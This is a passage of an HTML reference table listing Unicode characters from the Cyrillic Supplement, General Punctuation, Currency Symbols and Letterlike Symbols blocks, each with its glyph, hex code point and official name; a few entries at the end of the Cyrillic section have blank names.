<td style="text-align:center">0501</td>
<td style="text-align:center">CYRILLIC SMALL LETTER KOMI DE</td>
</tr>
<tr>
<td style="text-align:center">Ԃ</td>
<td style="text-align:center">0502</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER KOMI DJE</td>
</tr>
<tr>
<td style="text-align:center">ԃ</td>
<td style="text-align:center">0503</td>
<td style="text-align:center">CYRILLIC SMALL LETTER KOMI DJE</td>
</tr>
<tr>
<td style="text-align:center">Ԅ</td>
<td style="text-align:center">0504</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER KOMI ZJE</td>
</tr>
<tr>
<td style="text-align:center">ԅ</td>
<td style="text-align:center">0505</td>
<td style="text-align:center">CYRILLIC SMALL LETTER KOMI ZJE</td>
</tr>
<tr>
<td style="text-align:center">Ԇ</td>
<td style="text-align:center">0506</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER KOMI DZJE</td>
</tr>
<tr>
<td style="text-align:center">ԇ</td>
<td style="text-align:center">0507</td>
<td style="text-align:center">CYRILLIC SMALL LETTER KOMI DZJE</td>
</tr>
<tr>
<td style="text-align:center">Ԉ</td>
<td style="text-align:center">0508</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER KOMI LJE</td>
</tr>
<tr>
<td style="text-align:center">ԉ</td>
<td style="text-align:center">0509</td>
<td style="text-align:center">CYRILLIC SMALL LETTER KOMI LJE</td>
</tr>
<tr>
<td style="text-align:center">Ԋ</td>
<td style="text-align:center">050A</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER KOMI NJE</td>
</tr>
<tr>
<td style="text-align:center">ԋ</td>
<td style="text-align:center">050B</td>
<td style="text-align:center">CYRILLIC SMALL LETTER KOMI NJE</td>
</tr>
<tr>
<td style="text-align:center">Ԍ</td>
<td style="text-align:center">050C</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER KOMI SJE</td>
</tr>
<tr>
<td style="text-align:center">ԍ</td>
<td style="text-align:center">050D</td>
<td style="text-align:center">CYRILLIC SMALL LETTER KOMI SJE</td>
</tr>
<tr>
<td style="text-align:center">Ԏ</td>
<td style="text-align:center">050E</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER KOMI TJE</td>
</tr>
<tr>
<td style="text-align:center">ԏ</td>
<td style="text-align:center">050F</td>
<td style="text-align:center">CYRILLIC SMALL LETTER KOMI TJE</td>
</tr>
<tr>
<td style="text-align:center">Ԕ</td>
<td style="text-align:center">0514</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER LHA</td>
</tr>
<tr>
<td style="text-align:center">ԕ</td>
<td style="text-align:center">0515</td>
<td style="text-align:center">CYRILLIC SMALL LETTER LHA</td>
</tr>
<tr>
<td style="text-align:center">Ԗ</td>
<td style="text-align:center">0516</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER RHA</td>
</tr>
<tr>
<td style="text-align:center">ԗ</td>
<td style="text-align:center">0517</td>
<td style="text-align:center">CYRILLIC SMALL LETTER RHA</td>
</tr>
<tr>
<td style="text-align:center">Ԙ</td>
<td style="text-align:center">0518</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER YAE</td>
</tr>
<tr>
<td style="text-align:center">ԙ</td>
<td style="text-align:center">0519</td>
<td style="text-align:center">CYRILLIC SMALL LETTER YAE</td>
</tr>
<tr>
<td style="text-align:center">Ԛ</td>
<td style="text-align:center">051A</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER QA</td>
</tr>
<tr>
<td style="text-align:center">ԛ</td>
<td style="text-align:center">051B</td>
<td style="text-align:center">CYRILLIC SMALL LETTER QA</td>
</tr>
<tr>
<td style="text-align:center">Ԝ</td>
<td style="text-align:center">051C</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER WE</td>
</tr>
<tr>
<td style="text-align:center">ԝ</td>
<td style="text-align:center">051D</td>
<td style="text-align:center">CYRILLIC SMALL LETTER WE</td>
</tr>
<tr>
<td style="text-align:center">Ԟ</td>
<td style="text-align:center">051E</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER ALEUT KA</td>
</tr>
<tr>
<td style="text-align:center">ԟ</td>
<td style="text-align:center">051F</td>
<td style="text-align:center">CYRILLIC SMALL LETTER ALEUT KA</td>
</tr>
<tr>
<td style="text-align:center">Ԡ</td>
<td style="text-align:center">0520</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER EL WITH MIDDLE HOOK</td>
</tr>
<tr>
<td style="text-align:center">ԡ</td>
<td style="text-align:center">0521</td>
<td style="text-align:center">CYRILLIC SMALL LETTER EL WITH MIDDLE HOOK</td>
</tr>
<tr>
<td style="text-align:center">Ԣ</td>
<td style="text-align:center">0522</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER EN WITH MIDDLE HOOK</td>
</tr>
<tr>
<td style="text-align:center">ԣ</td>
<td style="text-align:center">0523</td>
<td style="text-align:center">CYRILLIC SMALL LETTER EN WITH MIDDLE HOOK</td>
</tr>
<tr>
<td style="text-align:center">Ԥ</td>
<td style="text-align:center">0524</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER PE WITH DESCENDER</td>
</tr>
<tr>
<td style="text-align:center">ԥ</td>
<td style="text-align:center">0525</td>
<td style="text-align:center">CYRILLIC SMALL LETTER PE WITH DESCENDER</td>
</tr>
<tr>
<td style="text-align:center">Ԧ</td>
<td style="text-align:center">0526</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER SHHA WITH DESCENDER</td>
</tr>
<tr>
<td style="text-align:center">ԧ</td>
<td style="text-align:center">0527</td>
<td style="text-align:center">CYRILLIC SMALL LETTER SHHA WITH DESCENDER</td>
</tr>
<tr>
<td style="text-align:center">Ԩ</td>
<td style="text-align:center">0528</td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">ԩ</td>
<td style="text-align:center">0529</td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">Ԫ</td>
<td style="text-align:center">052A</td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">ԫ</td>
<td style="text-align:center">052B</td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">Ԭ</td>
<td style="text-align:center">052C</td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">ԭ</td>
<td style="text-align:center">052D</td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">Ԯ</td>
<td style="text-align:center">052E</td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">ԯ</td>
<td style="text-align:center">052F</td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center">2000</td>
<td style="text-align:center">EN QUAD</td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center">2001</td>
<td style="text-align:center">EM QUAD</td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center">2002</td>
<td style="text-align:center">EN SPACE</td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center">2003</td>
<td style="text-align:center">EM SPACE</td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center">2004</td>
<td style="text-align:center">THREE-PER-EM SPACE</td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center">2005</td>
<td style="text-align:center">FOUR-PER-EM SPACE</td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center">2006</td>
<td style="text-align:center">SIX-PER-EM SPACE</td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center">2007</td>
<td style="text-align:center">FIGURE SPACE</td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center">2008</td>
<td style="text-align:center">PUNCTUATION SPACE</td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center">2009</td>
<td style="text-align:center">THIN SPACE</td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center">200A</td>
<td style="text-align:center">HAIR SPACE</td>
</tr>
<tr>
<td style="text-align:center">​</td>
<td style="text-align:center">200B</td>
<td style="text-align:center">ZERO WIDTH SPACE</td>
</tr>
<tr>
<td style="text-align:center">‌</td>
<td style="text-align:center">200C</td>
<td style="text-align:center">ZERO WIDTH NON-JOINER</td>
</tr>
<tr>
<td style="text-align:center">‍</td>
<td style="text-align:center">200D</td>
<td style="text-align:center">ZERO WIDTH JOINER</td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center">200E</td>
<td style="text-align:center">LEFT-TO-RIGHT MARK</td>
</tr>
<tr>
<td style="text-align:center">‏</td>
<td style="text-align:center">200F</td>
<td style="text-align:center">RIGHT-TO-LEFT MARK</td>
</tr>
<tr>
<td style="text-align:center">‐</td>
<td style="text-align:center">2010</td>
<td style="text-align:center">HYPHEN</td>
</tr>
<tr>
<td style="text-align:center">‑</td>
<td style="text-align:center">2011</td>
<td style="text-align:center">NON-BREAKING HYPHEN</td>
</tr>
<tr>
<td style="text-align:center">‒</td>
<td style="text-align:center">2012</td>
<td style="text-align:center">FIGURE DASH</td>
</tr>
<tr>
<td style="text-align:center">–</td>
<td style="text-align:center">2013</td>
<td style="text-align:center">EN DASH</td>
</tr>
<tr>
<td style="text-align:center">—</td>
<td style="text-align:center">2014</td>
<td style="text-align:center">EM DASH</td>
</tr>
<tr>
<td style="text-align:center">―</td>
<td style="text-align:center">2015</td>
<td style="text-align:center">HORIZONTAL BAR</td>
</tr>
<tr>
<td style="text-align:center">‖</td>
<td style="text-align:center">2016</td>
<td style="text-align:center">DOUBLE VERTICAL LINE</td>
</tr>
<tr>
<td style="text-align:center">‗</td>
<td style="text-align:center">2017</td>
<td style="text-align:center">DOUBLE LOW LINE</td>
</tr>
<tr>
<td style="text-align:center">‘</td>
<td style="text-align:center">2018</td>
<td style="text-align:center">LEFT SINGLE QUOTATION MARK</td>
</tr>
<tr>
<td style="text-align:center">’</td>
<td style="text-align:center">2019</td>
<td style="text-align:center">RIGHT SINGLE QUOTATION MARK</td>
</tr>
<tr>
<td style="text-align:center">‚</td>
<td style="text-align:center">201A</td>
<td style="text-align:center">SINGLE LOW-9 QUOTATION MARK</td>
</tr>
<tr>
<td style="text-align:center">‛</td>
<td style="text-align:center">201B</td>
<td style="text-align:center">SINGLE HIGH-REVERSED-9 QUOTATION MARK</td>
</tr>
<tr>
<td style="text-align:center">“</td>
<td style="text-align:center">201C</td>
<td style="text-align:center">LEFT DOUBLE QUOTATION MARK</td>
</tr>
<tr>
<td style="text-align:center">”</td>
<td style="text-align:center">201D</td>
<td style="text-align:center">RIGHT DOUBLE QUOTATION MARK</td>
</tr>
<tr>
<td style="text-align:center">„</td>
<td style="text-align:center">201E</td>
<td style="text-align:center">DOUBLE LOW-9 QUOTATION MARK</td>
</tr>
<tr>
<td style="text-align:center">‟</td>
<td style="text-align:center">201F</td>
<td style="text-align:center">DOUBLE HIGH-REVERSED-9 QUOTATION MARK</td>
</tr>
<tr>
<td style="text-align:center">†</td>
<td style="text-align:center">2020</td>
<td style="text-align:center">DAGGER</td>
</tr>
<tr>
<td style="text-align:center">‡</td>
<td style="text-align:center">2021</td>
<td style="text-align:center">DOUBLE DAGGER</td>
</tr>
<tr>
<td style="text-align:center">•</td>
<td style="text-align:center">2022</td>
<td style="text-align:center">BULLET</td>
</tr>
<tr>
<td style="text-align:center">‣</td>
<td style="text-align:center">2023</td>
<td style="text-align:center">TRIANGULAR BULLET</td>
</tr>
<tr>
<td style="text-align:center">․</td>
<td style="text-align:center">2024</td>
<td style="text-align:center">ONE DOT LEADER</td>
</tr>
<tr>
<td style="text-align:center">‥</td>
<td style="text-align:center">2025</td>
<td style="text-align:center">TWO DOT LEADER</td>
</tr>
<tr>
<td style="text-align:center">…</td>
<td style="text-align:center">2026</td>
<td style="text-align:center">HORIZONTAL ELLIPSIS</td>
</tr>
<tr>
<td style="text-align:center">‧</td>
<td style="text-align:center">2027</td>
<td style="text-align:center">HYPHENATION POINT</td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center">2028</td>
<td style="text-align:center">LINE SEPARATOR</td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center">2029</td>
<td style="text-align:center">PARAGRAPH SEPARATOR</td>
</tr>
<tr>
<td style="text-align:center">‪</td>
<td style="text-align:center">202A</td>
<td style="text-align:center">LEFT-TO-RIGHT EMBEDDING</td>
</tr>
<tr>
<td style="text-align:center">‫</td>
<td style="text-align:center">202B</td>
<td style="text-align:center">RIGHT-TO-LEFT EMBEDDING</td>
</tr>
<tr>
<td style="text-align:center">‬</td>
<td style="text-align:center">202C</td>
<td style="text-align:center">POP DIRECTIONAL FORMATTING</td>
</tr>
<tr>
<td style="text-align:center">‭</td>
<td style="text-align:center">202D</td>
<td style="text-align:center">LEFT-TO-RIGHT OVERRIDE</td>
</tr>
<tr>
<td style="text-align:center">‮</td>
<td style="text-align:center">202E</td>
<td style="text-align:center">RIGHT-TO-LEFT OVERRIDE</td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center">202F</td>
<td style="text-align:center">NARROW NON-BREAK SPACE</td>
</tr>
<tr>
<td style="text-align:center">‰</td>
<td style="text-align:center">2030</td>
<td style="text-align:center">PER MILLE SIGN</td>
</tr>
<tr>
<td style="text-align:center">‱</td>
<td style="text-align:center">2031</td>
<td style="text-align:center">PER TEN THOUSAND SIGN</td>
</tr>
<tr>
<td style="text-align:center">′</td>
<td style="text-align:center">2032</td>
<td style="text-align:center">PRIME</td>
</tr>
<tr>
<td style="text-align:center">″</td>
<td style="text-align:center">2033</td>
<td style="text-align:center">DOUBLE PRIME</td>
</tr>
<tr>
<td style="text-align:center">‴</td>
<td style="text-align:center">2034</td>
<td style="text-align:center">TRIPLE PRIME</td>
</tr>
<tr>
<td style="text-align:center">‵</td>
<td style="text-align:center">2035</td>
<td style="text-align:center">REVERSED PRIME</td>
</tr>
<tr>
<td style="text-align:center">‶</td>
<td style="text-align:center">2036</td>
<td style="text-align:center">REVERSED DOUBLE PRIME</td>
</tr>
<tr>
<td style="text-align:center">‷</td>
<td style="text-align:center">2037</td>
<td style="text-align:center">REVERSED TRIPLE PRIME</td>
</tr>
<tr>
<td style="text-align:center">‸</td>
<td style="text-align:center">2038</td>
<td style="text-align:center">CARET</td>
</tr>
<tr>
<td style="text-align:center">‹</td>
<td style="text-align:center">2039</td>
<td style="text-align:center">SINGLE LEFT-POINTING ANGLE QUOTATION MARK</td>
</tr>
<tr>
<td style="text-align:center">›</td>
<td style="text-align:center">203A</td>
<td style="text-align:center">SINGLE RIGHT-POINTING ANGLE QUOTATION MARK</td>
</tr>
<tr>
<td style="text-align:center">※</td>
<td style="text-align:center">203B</td>
<td style="text-align:center">REFERENCE MARK</td>
</tr>
<tr>
<td style="text-align:center">‼</td>
<td style="text-align:center">203C</td>
<td style="text-align:center">DOUBLE EXCLAMATION MARK</td>
</tr>
<tr>
<td style="text-align:center">‽</td>
<td style="text-align:center">203D</td>
<td style="text-align:center">INTERROBANG</td>
</tr>
<tr>
<td style="text-align:center">‾</td>
<td style="text-align:center">203E</td>
<td style="text-align:center">OVERLINE</td>
</tr>
<tr>
<td style="text-align:center">‿</td>
<td style="text-align:center">203F</td>
<td style="text-align:center">UNDERTIE</td>
</tr>
<tr>
<td style="text-align:center">⁀</td>
<td style="text-align:center">2040</td>
<td style="text-align:center">CHARACTER TIE</td>
</tr>
<tr>
<td style="text-align:center">⁁</td>
<td style="text-align:center">2041</td>
<td style="text-align:center">CARET INSERTION POINT</td>
</tr>
<tr>
<td style="text-align:center">⁂</td>
<td style="text-align:center">2042</td>
<td style="text-align:center">ASTERISM</td>
</tr>
<tr>
<td style="text-align:center">⁃</td>
<td style="text-align:center">2043</td>
<td style="text-align:center">HYPHEN BULLET</td>
</tr>
<tr>
<td style="text-align:center">⁄</td>
<td style="text-align:center">2044</td>
<td style="text-align:center">FRACTION SLASH</td>
</tr>
<tr>
<td style="text-align:center">⁅</td>
<td style="text-align:center">2045</td>
<td style="text-align:center">LEFT SQUARE BRACKET WITH QUILL</td>
</tr>
<tr>
<td style="text-align:center">⁆</td>
<td style="text-align:center">2046</td>
<td style="text-align:center">RIGHT SQUARE BRACKET WITH QUILL</td>
</tr>
<tr>
<td style="text-align:center">⁇</td>
<td style="text-align:center">2047</td>
<td style="text-align:center">DOUBLE QUESTION MARK</td>
</tr>
<tr>
<td style="text-align:center">⁈</td>
<td style="text-align:center">2048</td>
<td style="text-align:center">QUESTION EXCLAMATION MARK</td>
</tr>
<tr>
<td style="text-align:center">⁉</td>
<td style="text-align:center">2049</td>
<td style="text-align:center">EXCLAMATION QUESTION MARK</td>
</tr>
<tr>
<td style="text-align:center">⁊</td>
<td style="text-align:center">204A</td>
<td style="text-align:center">TIRONIAN SIGN ET</td>
</tr>
<tr>
<td style="text-align:center">⁋</td>
<td style="text-align:center">204B</td>
<td style="text-align:center">REVERSED PILCROW SIGN</td>
</tr>
<tr>
<td style="text-align:center">⁌</td>
<td style="text-align:center">204C</td>
<td style="text-align:center">BLACK LEFTWARDS BULLET</td>
</tr>
<tr>
<td style="text-align:center">⁍</td>
<td style="text-align:center">204D</td>
<td style="text-align:center">BLACK RIGHTWARDS BULLET</td>
</tr>
<tr>
<td style="text-align:center">⁎</td>
<td style="text-align:center">204E</td>
<td style="text-align:center">LOW ASTERISK</td>
</tr>
<tr>
<td style="text-align:center">⁏</td>
<td style="text-align:center">204F</td>
<td style="text-align:center">REVERSED SEMICOLON</td>
</tr>
<tr>
<td style="text-align:center">⁐</td>
<td style="text-align:center">2050</td>
<td style="text-align:center">CLOSE UP</td>
</tr>
<tr>
<td style="text-align:center">⁑</td>
<td style="text-align:center">2051</td>
<td style="text-align:center">TWO ASTERISKS ALIGNED VERTICALLY</td>
</tr>
<tr>
<td style="text-align:center">⁒</td>
<td style="text-align:center">2052</td>
<td style="text-align:center">COMMERCIAL MINUS SIGN</td>
</tr>
<tr>
<td style="text-align:center">⁓</td>
<td style="text-align:center">2053</td>
<td style="text-align:center">SWUNG DASH</td>
</tr>
<tr>
<td style="text-align:center">⁔</td>
<td style="text-align:center">2054</td>
<td style="text-align:center">INVERTED UNDERTIE</td>
</tr>
<tr>
<td style="text-align:center">⁕</td>
<td style="text-align:center">2055</td>
<td style="text-align:center">FLOWER PUNCTUATION MARK</td>
</tr>
<tr>
<td style="text-align:center">⁖</td>
<td style="text-align:center">2056</td>
<td style="text-align:center">THREE DOT PUNCTUATION</td>
</tr>
<tr>
<td style="text-align:center">⁗</td>
<td style="text-align:center">2057</td>
<td style="text-align:center">QUADRUPLE PRIME</td>
</tr>
<tr>
<td style="text-align:center">⁘</td>
<td style="text-align:center">2058</td>
<td style="text-align:center">FOUR DOT PUNCTUATION</td>
</tr>
<tr>
<td style="text-align:center">⁙</td>
<td style="text-align:center">2059</td>
<td style="text-align:center">FIVE DOT PUNCTUATION</td>
</tr>
<tr>
<td style="text-align:center">⁚</td>
<td style="text-align:center">205A</td>
<td style="text-align:center">TWO DOT PUNCTUATION</td>
</tr>
<tr>
<td style="text-align:center">⁛</td>
<td style="text-align:center">205B</td>
<td style="text-align:center">FOUR DOT MARK</td>
</tr>
<tr>
<td style="text-align:center">⁜</td>
<td style="text-align:center">205C</td>
<td style="text-align:center">DOTTED CROSS</td>
</tr>
<tr>
<td style="text-align:center">⁝</td>
<td style="text-align:center">205D</td>
<td style="text-align:center">TRICOLON</td>
</tr>
<tr>
<td style="text-align:center">⁞</td>
<td style="text-align:center">205E</td>
<td style="text-align:center">VERTICAL FOUR DOTS</td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center">205F</td>
<td style="text-align:center">MEDIUM MATHEMATICAL SPACE</td>
</tr>
<tr>
<td style="text-align:center">⁠</td>
<td style="text-align:center">2060</td>
<td style="text-align:center">WORD JOINER</td>
</tr>
<tr>
<td style="text-align:center">⁡</td>
<td style="text-align:center">2061</td>
<td style="text-align:center">FUNCTION APPLICATION</td>
</tr>
<tr>
<td style="text-align:center">⁢</td>
<td style="text-align:center">2062</td>
<td style="text-align:center">INVISIBLE TIMES</td>
</tr>
<tr>
<td style="text-align:center">⁣</td>
<td style="text-align:center">2063</td>
<td style="text-align:center">INVISIBLE SEPARATOR</td>
</tr>
<tr>
<td style="text-align:center">⁤</td>
<td style="text-align:center">2064</td>
<td style="text-align:center">INVISIBLE PLUS</td>
</tr>
<tr>
<td style="text-align:center">⁦</td>
<td style="text-align:center">2066</td>
<td style="text-align:center">LEFT-TO-RIGHT ISOLATE</td>
</tr>
<tr>
<td style="text-align:center">⁧</td>
<td style="text-align:center">2067</td>
<td style="text-align:center">RIGHT-TO-LEFT ISOLATE</td>
</tr>
<tr>
<td style="text-align:center">⁨</td>
<td style="text-align:center">2068</td>
<td style="text-align:center">FIRST STRONG ISOLATE</td>
</tr>
<tr>
<td style="text-align:center">⁩</td>
<td style="text-align:center">2069</td>
<td style="text-align:center">POP DIRECTIONAL ISOLATE</td>
</tr>
<tr>
<td style="text-align:center">⁪</td>
<td style="text-align:center">206A</td>
<td style="text-align:center">INHIBIT SYMMETRIC SWAPPING</td>
</tr>
<tr>
<td style="text-align:center">⁫</td>
<td style="text-align:center">206B</td>
<td style="text-align:center">ACTIVATE SYMMETRIC SWAPPING</td>
</tr>
<tr>
<td style="text-align:center">⁬</td>
<td style="text-align:center">206C</td>
<td style="text-align:center">INHIBIT ARABIC FORM SHAPING</td>
</tr>
<tr>
<td style="text-align:center">⁭</td>
<td style="text-align:center">206D</td>
<td style="text-align:center">ACTIVATE ARABIC FORM SHAPING</td>
</tr>
<tr>
<td style="text-align:center">⁮</td>
<td style="text-align:center">206E</td>
<td style="text-align:center">NATIONAL DIGIT SHAPES</td>
</tr>
<tr>
<td style="text-align:center">⁯</td>
<td style="text-align:center">206F</td>
<td style="text-align:center">NOMINAL DIGIT SHAPES</td>
</tr>
<tr>
<td style="text-align:center">₠</td>
<td style="text-align:center">20A0</td>
<td style="text-align:center">EURO-CURRENCY SIGN</td>
</tr>
<tr>
<td style="text-align:center">₡</td>
<td style="text-align:center">20A1</td>
<td style="text-align:center">COLON SIGN</td>
</tr>
<tr>
<td style="text-align:center">₢</td>
<td style="text-align:center">20A2</td>
<td style="text-align:center">CRUZEIRO SIGN</td>
</tr>
<tr>
<td style="text-align:center">₣</td>
<td style="text-align:center">20A3</td>
<td style="text-align:center">FRENCH FRANC SIGN</td>
</tr>
<tr>
<td style="text-align:center">₤</td>
<td style="text-align:center">20A4</td>
<td style="text-align:center">LIRA SIGN</td>
</tr>
<tr>
<td style="text-align:center">₥</td>
<td style="text-align:center">20A5</td>
<td style="text-align:center">MILL SIGN</td>
</tr>
<tr>
<td style="text-align:center">₦</td>
<td style="text-align:center">20A6</td>
<td style="text-align:center">NAIRA SIGN</td>
</tr>
<tr>
<td style="text-align:center">₧</td>
<td style="text-align:center">20A7</td>
<td style="text-align:center">PESETA SIGN</td>
</tr>
<tr>
<td style="text-align:center">₨</td>
<td style="text-align:center">20A8</td>
<td style="text-align:center">RUPEE SIGN</td>
</tr>
<tr>
<td style="text-align:center">₩</td>
<td style="text-align:center">20A9</td>
<td style="text-align:center">WON SIGN</td>
</tr>
<tr>
<td style="text-align:center">₪</td>
<td style="text-align:center">20AA</td>
<td style="text-align:center">NEW SHEQEL SIGN</td>
</tr>
<tr>
<td style="text-align:center">₫</td>
<td style="text-align:center">20AB</td>
<td style="text-align:center">DONG SIGN</td>
</tr>
<tr>
<td style="text-align:center">€</td>
<td style="text-align:center">20AC</td>
<td style="text-align:center">EURO SIGN</td>
</tr>
<tr>
<td style="text-align:center">₭</td>
<td style="text-align:center">20AD</td>
<td style="text-align:center">KIP SIGN</td>
</tr>
<tr>
<td style="text-align:center">₮</td>
<td style="text-align:center">20AE</td>
<td style="text-align:center">TUGRIK SIGN</td>
</tr>
<tr>
<td style="text-align:center">₯</td>
<td style="text-align:center">20AF</td>
<td style="text-align:center">DRACHMA SIGN</td>
</tr>
<tr>
<td style="text-align:center">₰</td>
<td style="text-align:center">20B0</td>
<td style="text-align:center">GERMAN PENNY SYMBOL</td>
</tr>
<tr>
<td style="text-align:center">₱</td>
<td style="text-align:center">20B1</td>
<td style="text-align:center">PESO SIGN</td>
</tr>
<tr>
<td style="text-align:center">₲</td>
<td style="text-align:center">20B2</td>
<td style="text-align:center">GUARANI SIGN</td>
</tr>
<tr>
<td style="text-align:center">₳</td>
<td style="text-align:center">20B3</td>
<td style="text-align:center">AUSTRAL SIGN</td>
</tr>
<tr>
<td style="text-align:center">₴</td>
<td style="text-align:center">20B4</td>
<td style="text-align:center">HRYVNIA SIGN</td>
</tr>
<tr>
<td style="text-align:center">₵</td>
<td style="text-align:center">20B5</td>
<td style="text-align:center">CEDI SIGN</td>
</tr>
<tr>
<td style="text-align:center">₶</td>
<td style="text-align:center">20B6</td>
<td style="text-align:center">LIVRE TOURNOIS SIGN</td>
</tr>
<tr>
<td style="text-align:center">₷</td>
<td style="text-align:center">20B7</td>
<td style="text-align:center">SPESMILO SIGN</td>
</tr>
<tr>
<td style="text-align:center">₸</td>
<td style="text-align:center">20B8</td>
<td style="text-align:center">TENGE SIGN</td>
</tr>
<tr>
<td style="text-align:center">₹</td>
<td style="text-align:center">20B9</td>
<td style="text-align:center">INDIAN RUPEE SIGN</td>
</tr>
<tr>
<td style="text-align:center">℀</td>
<td style="text-align:center">2100</td>
<td style="text-align:center">ACCOUNT OF</td>
</tr>
<tr>
<td style="text-align:center">℁</td>
<td style="text-align:center">2101</td>
<td style="text-align:center">ADDRESSED TO THE SUBJECT</td>
</tr>
<tr>
<td style="text-align:center">ℂ</td>
<td style="text-align:center">2102</td>
<td style="text-align:center">DOUBLE-STRUCK CAPITAL C</td>
</tr>
<tr>
<td style="text-align:center">℃</td>
<td style="text-align:center">2103</td>
<td style="text-align:center">DEGREE CELSIUS</td>
</tr>
<tr>
<td style="text-align:center">℄</td>
<td style="text-align:center">2104</td>
<td style="text-align:center">CENTRE LINE SYMBOL</td>
</tr>
<tr>
<td style="text-align:center">℅</td>
<td style="text-align:center">2105</td>
<td style="text-align:center">CARE OF</td>
</tr>
<tr>
<td style="text-align:center">℆</td>
<td style="text-align:center">2106</td>
<td style="text-align:center">CADA UNA</td>
</tr>
<tr>
<td style="text-align:center">ℇ</td>
<td style="text-align:center">2107</td>
<td style="text-align:center">EULER CONSTANT</td>
</tr>
<tr>
<td style="text-align:center">℈</td>
<td style="text-align:center">2108</td>
<td style="text-align:center">SCRUPLE</td>
</tr>
<tr>
<td style="text-align:center">℉</td>
<td style="text-align:center">2109</td>
<td style="text-align:center">DEGREE FAHRENHEIT</td>
</tr>
<tr>
<td style="text-align:center">ℊ</td>
<td style="text-align:center">210A</td>
<td style="text-align:center">SCRIPT SMALL G</td>
</tr>
<tr>
<td style="text-align:center">ℋ</td>
<td style="text-align:center">210B</td>
<td style="text-align:center">SCRIPT CAPITAL H</td>
</tr>
<tr>
<td style="text-align:center">ℌ</td>
<td style="text-align:center">210C</td>
<td style="text-align:center">BLACK-LETTER CAPITAL H</td>
</tr>
<tr>
<td style="text-align:center">ℍ</td>
<td style="text-align:center">210D</td>
<td style="text-align:center">DOUBLE-STRUCK CAPITAL H</td>
</tr>
<tr>
<td style="text-align:center">ℎ</td>
<td style="text-align:center">210E</td>
<td style="text-align:center">PLANCK CONSTANT</td>
</tr>
<tr>
<td style="text-align:center">ℏ</td>
<td style="text-align:center">210F</td>
<td style="text-align:center">PLANCK CONSTANT OVER TWO PI</td>
</tr>
<tr>
<td style="text-align:center">ℐ</td>
<td style="text-align:center">2110</td>
<td style="text-align:center">SCRIPT CAPITAL I</td>
</tr>
<tr>
<td style="text-align:center">ℑ</td>
<td style="text-align:center">2111</td>
<td style="text-align:center">BLACK-LETTER CAPITAL I</td>
</tr>
<tr>
<td style="text-align:center">ℒ</td>
<td style="text-align:center">2112</td>
<td style="text-align:center">SCRIPT CAPITAL L</td>
</tr>
<tr>
<td style="text-align:center">ℓ</td>
<td style="text-align:center">2113</td>
<td style="text-align:center">SCRIPT SMALL L</td>
</tr>
<tr>
<td style="text-align:center">℔</td>
<td style="text-align:center">2114</td>
<td style="text-align:center">L B BAR SYMBOL</td>
</tr>
<tr>
<td style="text-align:center">ℕ</td>
<td style="text-align:center">2115</td>
<td style="text-align:center">DOUBLE-STRUCK CAPITAL N</td>
</tr>
<tr>
<td style="text-align:center">№</td>
<td style="text-align:center">2116</td>
<td style="text-align:center">NUMERO SIGN</td>
</tr>
<tr>
<td style="text-align:center">℗</td>
<td style="text-align:center">2117</td>
<td style="text-align:center">SOUND RECORDING COPYRIGHT</td>
</tr>
<tr>
<td style="text-align:center">℘</td>
<td style="text-align:center">2118</td>
<td style="text-align:center">SCRIPT CAPITAL P</td>
</tr>
<tr>
<td style="text-align:center">ℙ</td>
<td style="text-align:center">2119</td>
<td style="text-align:center">DOUBLE-STRUCK CAPITAL P</td>
</tr>
<tr>
<td style="text-align:center">ℚ</td>
<td style="text-align:center">211A</td>
<td style="text-align:center">DOUBLE-STRUCK CAPITAL Q</td>
</tr>
<tr>
<td style="text-align:center">ℛ</td>
<td style="text-align:center">211B</td>
<td style="text-align:center">SCRIPT CAPITAL R</td>
</tr>
<tr>
<td style="text-align:center">ℜ</td>
<td style="text-align:center">211C</td>
<td style="text-align:center">BLACK-LETTER CAPITAL R</td>
</tr>
<tr>
<td style="text-align:center">ℝ</td>
<td style="text-align:center">211D</td>
<td style="text-align:center">DOUBLE-STRUCK CAPITAL R</td>
</tr>
<tr>
<td style="text-align:center">℞</td>
<td style="text-align:center">211E</td>
<td style="text-align:center">PRESCRIPTION TAKE</td>
</tr>
<tr>
<td style="text-align:center">℟</td>
<td style="text-align:center">211F</td>
<td style="text-align:center">RESPONSE</td>
